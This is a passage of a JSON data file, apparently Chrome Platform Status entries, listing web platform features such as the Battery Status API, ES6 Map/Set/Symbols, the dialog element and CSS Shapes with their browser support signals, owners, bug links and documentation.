          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "timvolodine@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PermissionsAPI"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "http://crbug.com/122593",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Allows access to see the battery level of the device's battery",
    "id": 4537134732017664,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/battery-status",
        "http://jsbin.com/battery-status-test",
        "http://htmlpreview.github.io/?https://github.com/samdutton/simpl/blob/master/battery/index.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:57.643330",
      "by": "ericbidelman@google.com"
    },
    "name": "Encoding API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://encoding.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Releases/18",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "jsbell@chromium.org",
          "kbr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 38,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "http://crbug.com/398149",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Script API to allow encoding/decoding of strings from binary data. Common scenario: decoding a binary data file fetched via XHR into an ArrayBuffer that contains strings encoded as UTF-8.",
    "id": 5714368087982080,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2014/08/Easier-ArrayBuffer---String-conversion-with-the-Encoding-API",
        "https://developer.mozilla.org/en-US/docs/Web/API/Encoding_API"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/encoding-api"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:29:00.399030",
      "by": "ericbidelman@google.com"
    },
    "name": "File constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/2006/webapi/FileAPI/#file",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=819900",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "costan@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 38,
        "ios": 38,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "http://crbug.com/164933",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A programmatic method of constructing File objects, very similar to how Blob objects are built.",
    "id": 5731244088229888,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/File"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/file-constructor"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:29.711160",
      "by": "ericbidelman@google.com"
    },
    "name": "JS iterators (i.e. the for-of feature) (ES6)",
    "tags": [
      "forof",
      ""
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-iteration-statements",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/13#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "mstarzinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2214",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/es6iteratorsietheforoffeature",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-generators",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Iterates over iterable objects (including arrays, array-like objects, iterators and generators), invoking a custom iteration hook with statements to be executed for the value of each distinct property.",
    "id": 4696563918045184,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of",
        "",
        "http://updates.html5rocks.com/2014/08/Collecting-and-Iterating-the-ES6-Way"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/collections-iterators-es6"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:31.977180",
      "by": "ericbidelman@google.com"
    },
    "name": "Map (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-map-objects",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/13#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "adamk@chromium.org",
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/v8/issues/detail?id=1622",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn263029",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/154861",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Map objects are simple key/value maps.",
    "id": 4818609708728320,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map",
        "http://updates.html5rocks.com/2014/08/Collecting-and-Iterating-the-ES6-Way"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/collections-iterators-es6"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:08.325150",
      "by": "ericbidelman@google.com"
    },
    "name": "Math functions (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-math-object",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "yangguo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2938",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/mathbuiltinses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/browser/trunk/Source/JavaScriptCore/runtime/MathObject.cpp",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Math related functions - sign, trunc, sinh, cosh, tanh, asinh, acosh, atanh, log10, log2, hypot, fround, clz32, cbrt, log1p, expm1 (as Math.sign(...), Math.trunc(...) and so on).",
    "id": 5920790725787648,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math#Methods"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:08.557190",
      "by": "ericbidelman@google.com"
    },
    "name": "SVG (1.1) Fonts",
    "tags": [
      "svg",
      "svg fonts",
      "svgz",
      "svg font",
      "svg based fonts"
    ],
    "comments": "While support is removed for most platforms, Windows systems older than Windows 7, that use GDI based font rendering, instead of DirectWrite based font rendering, still support this feature, but the feature is considered deprecated and will be removed at a later date.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/SVG/fonts.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=119490",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 38
        },
        "owners": [
          "pdr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "http://crbug.com/242735",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "http://blogs.msdn.com/b/ie/archive/2010/08/04/html5-modernized-fourth-ie9-platform-preview-available-for-developers.aspx",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Use the SVG based font format (that non WebKit based browsers never implemented) as a @font-face web font.",
    "id": 5930075908210688,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:29:11.611000",
      "by": "ericbidelman@google.com"
    },
    "name": "Screen Orientation API",
    "comments": "Firefox and IE ships it prefixed.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/screen-orientation/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=673922",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=162827",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/screenorientationapi",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Gives ability to read the screen orientation and lock it.",
    "id": 6191285283061760,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Screen/orientation"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:33.074000",
      "by": "ericbidelman@google.com"
    },
    "name": "Set (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-set-objects",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/13#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "adamk@chromium.org",
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/v8/issues/detail?id=1622",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/dn251547",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/154916",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Set objects let you store unique values of any type, whether primitive values or object references. ",
    "id": 4916191365693440,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set",
        "http://updates.html5rocks.com/2014/08/Collecting-and-Iterating-the-ES6-Way"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/collections-iterators-es6"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:09.759810",
      "by": "ericbidelman@google.com"
    },
    "name": "Symbols (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://people.mozilla.org/~jorendorff/es6-draft.html#sec-symbol-objects",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol#Browser_compatibility",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "rossberg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2158",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/symbols",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-symbol-objects",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows properties to be added to existing objects without the possibility of interference with the existing properties, unintended visibility, or with other uncoordinated additions by any other code.",
    "id": 6042091272536064,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:27.295250",
      "by": "ericbidelman@google.com"
    },
    "name": "Unscopables (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-symbol.unscopables",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/rwaldron/tc39-notes/blob/master/es6/2013-09/sept-17.md#consensusresolution-5",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 38
        },
        "owners": [
          "arv@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 38,
        "flag": false,
        "android": 38,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3401",
        "intervention": false
      },
      "opera": {
        "android": 25,
        "desktop": 25
      },
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/symbolses6",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/rwaldron/tc39-notes/blob/master/es6/2013-09/sept-17.md#consensusresolution-5",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Unscopables allows properties to be hidden to with statement lookup rules. This is important for adding new properties to existing objects both in JavaScript and in DOM.",
    "id": 4543115071324160,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-26 04:58:01.324130",
      "by": "Patket@microsoft.com"
    },
    "first_of_milestone": true,
    "name": "<dialog> Element",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://whatwg.org/html#the-dialog-element",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=840640",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "falken@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "http://crbug.com/140205",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/dialogelementformodals/?q=dialog",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2013-August/025354.html",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "An HTML element for a dialog box",
    "id": 5770237022568448,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2014/07/dialog-element-shipped-in-Chrome-37-Beta",
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/dialog/index.html",
        "http://demo.agektmr.com/dialog/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:11.428850",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS \"all\" shorthand",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css-cascade/#all-shorthand",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/27#CSS",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "hayato@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=172051",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/cssallshorthand",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The all property is a shorthand that resets all CSS properties except direction and unicode-bidi. It only accepts the CSS-wide keywords.",
    "id": 6178222542684160,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/all"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-07 02:41:26.057700",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Shapes Module Level 1",
    "comments": "Rossen Atanassov from Microsoft is co-editor of the spec.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/2014/CR-css-shapes-1-20140320/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "betravis@adobe.com",
          "bjonesbe@adobe.com",
          "zhorvath@adobe.com",
          "hmuller@adobe.com",
          "rob.buis@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 37,
        "flag": false,
        "bug": "http://crbug.com/249140",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/shapes",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=98664",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSS Shapes allows one to specify a geometric \"shape-outside\" for a \r\nfloat.  Content will wrap around the float's shape-outside, instead of \r\nits rectangular boundary. The shape-outside property can be specified \r\nwith a geometric primitive, like an ellipse or a polygon, or by the \r\npixels of an image's alpha channel whose values are greater than \r\nshape-image-threshold. A shape-outside's boundary can be uniformly \r\nexpanded with the shape-margin property. ",
    "id": 5163890719588352,
    "resources": {
      "docs": [
        "http://blogs.adobe.com/webplatform/category/features/css-shapes/",
        "http://www.html5rocks.com/en/tutorials/shapes/getting-started/",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/shape"
      ],
      "samples": [
        "https://github.com/GoogleChrome/samples/tree/gh-pages/css-shapes"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:29.960980",
      "by": "ericbidelman@google.com"
    },
    "name": "Cross Origin Font Loading Restriction",
    "tags": [
      "same origin",
      "cross origin",
      "woff",
      "font"
    ],
    "comments": "Microsoft removed CORS restriction on Mobile IE due to site compatibility: https://blogs.windows.com/msedgedev/2015/06/17/building-a-more-interoperable-web-with-microsoft-edge/#div-comment-1453",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.w3.org/TR/css-fonts-3/#font-fetching-requirements",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/%40font-face#Notes_2",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "http://crbug.com/286681",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://lists.webkit.org/pipermail/webkit-dev/2011-January/thread.html#15790",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Aligning with the specification (and other browsers) and blocking cross origin font loading, unless the response include the appropriate CORS headers.",
    "id": 4708736996212736,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:30.359960",
      "by": "ericbidelman@google.com"
    },
    "name": "DirectWrite on Windows",
    "comments": "Implementation bug: https://code.google.com/p/chromium/issues/detail?id=25541",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://blog.mozilla.org/nattokirai/2011/08/11/directwrite-text-rendering-in-firefox-6/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=367282",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/hh237264(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Use DirectWrite instead of GDI for text on Windows.",
    "id": 4725550652325888,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:40.974240",
      "by": "ericbidelman@google.com"
    },
    "name": "Fractional TouchEvent co-ordinates",
    "comments": "IE doesn't support TouchEvents so not directly relevant there, but they use doubles in their PointerEvents and have expressed support for changing TouchEvents as part of the TouchEvents community group: http://www.w3.org/2014/05/06-pointerevents-minutes.html#item06.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dvcs.w3.org/hg/webevents/raw-file/v1-errata/touchevents.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 37,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=379150",
        "intervention": false
      },
      "opera": {
        "android": 37,
        "desktop": 37
      },
      "edge": {
        "view": {
          "url": "http://blogs.msdn.com/b/ie/archive/2012/02/17/sub-pixel-rendering-and-the-css-object-model.aspx",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=133180",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Updates co-ordinates returned by TouchEvent objects to include the full precision provided by the underlying platform.",
    "id": 5442014145413120,
    "resources": {
      "docs": [
        "http://updates.html5rocks.com/2014/09/Precision-Touch-for-Precise-Gestures"
      ],
      "samples": [
        "http://www.rbyers.net/paint.html#points",
        "http://jsbin.com/idojig/2/quiet"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-26 04:55:29.416180",
      "by": "Patket@microsoft.com"
    },
    "name": "Navigator.hardwareConcurrency ",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://wiki.whatwg.org/wiki/NavigatorCores",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!topic/mozilla.dev.platform/QnhfUVw9jCI",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 37
        },
        "owners": [
          "esprehn@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 37,
        "blink_components": [
          "Blink"
        ],
        "desktop": 37,
        "flag": false,
        "android": 37,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=369629",
        "intervention": false
      },
      "opera": {
        "android": 24,
        "desktop": 24
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
